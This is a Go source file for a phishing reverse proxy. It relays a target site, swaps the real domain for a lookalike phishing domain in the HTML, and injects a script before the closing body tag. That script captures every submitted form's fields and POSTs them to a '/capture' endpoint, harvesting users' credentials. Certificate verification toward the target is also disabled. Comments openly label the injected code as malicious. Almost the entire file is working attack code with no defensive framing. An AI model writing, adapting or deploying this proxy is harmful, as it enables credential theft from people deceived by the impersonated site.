package main

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"crypto/tls"
	"io"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"

	"github.com/andybalholm/brotli"
)

const (
	targetDomain   = "example.com"
	phishingDomain = "ex-ample.com" // still confused abt this bit
	jsPayload      = `// Add malicious JS here
document.addEventListener('submit', function(e) {
	fetch('/capture', {
		method: 'POST',
		body: JSON.stringify(Array.from(new FormData(e.target)) 
	});
});`
)

func decompressBody(body io.ReadCloser, encoding string) ([]byte, error) {
	defer body.Close()

	log.Printf("[DECOMPRESS] Encoding: '%s'", encoding)

	switch encoding {
	case "br":
		br := brotli.NewReader(body)
		defer body.Close()
		return io.ReadAll(br)
	case "gzip":
		gr, err := gzip.NewReader(body)
		if err != nil {
			return nil, err
		}
		defer gr.Close()
		return io.ReadAll(gr)
	case "deflate":
		fr := flate.NewReader(body)
		defer fr.Close()
		return io.ReadAll(fr)
	default:
		return io.ReadAll(body)
	}
}

func compressBody(data []byte, encoding string) ([]byte, error) {
	var buf bytes.Buffer

	switch encoding {
	case "br":
		br := brotli.NewWriter(&buf)
		if _, err := br.Write(data); err != nil {
			return nil, err
		}
		br.Close()
	case "gzip":
		gw := gzip.NewWriter(&buf)
		if _, err := gw.Write(data); err != nil {
			return nil, err
		}
		gw.Close()
	case "deflate":
		fw, _ := flate.NewWriter(&buf, flate.BestCompression)
		if _, err := fw.Write(data); err != nil {
			return nil, err
		}
		fw.Close()
	default:
		buf.Write(data)
	}

	return buf.Bytes(), nil
}

func injectJS(body []byte, payload string) []byte {
	return bytes.Replace(body, []byte("</body>"),
		[]byte("<script>"+payload+"</script></body>"), 1)
}

func main() {
	target, _ := url.Parse("https://" + targetDomain)

	proxy := httputil.NewSingleHostReverseProxy(target)

	// Configure proxy-to-target TLS security
	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // Disable certificate verification while proxy connect target. It makes my app hackable?
	}

	// Director modify the request before it goes to the target
	proxy.Director = func(req *http.Request) {
		req.URL.Scheme = target.Scheme
		req.URL.Host = target.Host
		req.Host = target.Host // Critic for SNI in TLS handshake

		// Add security headers
		req.Header.Set("X-Forwarded-Proto", "https")
		req.Header.Set("X-Forwarded-For", req.RemoteAddr) // Preserve client IP
	}

	// Modify response from proxy to client
	proxy.ModifyResponse = func(resp *http.Response) error {
		// Only process HTML content
		if !strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
			return nil
		}

		// Process content encoding
		encoding := resp.Header.Get("Content-Encoding")
		body, err := decompressBody(resp.Body, encoding)
		if err != nil {
			return err
		}

		log.Println(string(body))

		// Modify content
		modified := bytes.ReplaceAll(body, []byte(targetDomain), []byte(phishingDomain)) // href, js, css
		modified = injectJS(modified, jsPayload)                                         // inject js just before </body>

		// Recompress and update response
		newBody, err := compressBody(modified, encoding)
		if err != nil {
			return err
		}

		resp.Body = io.NopCloser(bytes.NewReader(newBody))
		resp.Header.Del("Content-Length")
		resp.ContentLength = int64(len(newBody))

		if encoding != "" {
			resp.Header.Set("Content-Encoding", encoding)
		} else {
			resp.Header.Del("Content-Encoding")
		}

		return nil
	}

	// Configure server's TLS configurations
	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12, // Modern TLS 1.2+ Security
		NextProtos: []string{"http/1.1"},

		// Modern elliptic curves for ECDHE
		CurvePreferences: []tls.CurveID{
			tls.CurveP256,
			tls.X25519,
		},
		// Strong AEAD ciphers
		PreferServerCipherSuites: true,
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,   // Required for HTTP/2
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, // Required for HTTP/2
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		},
	}

	server := &http.Server{
		Addr:      ":443",
		Handler:   proxy,
		TLSConfig: tlsConfig,
	}

	log.Fatal(server.ListenAndServeTLS("cert.pem", "key.pem"))

}
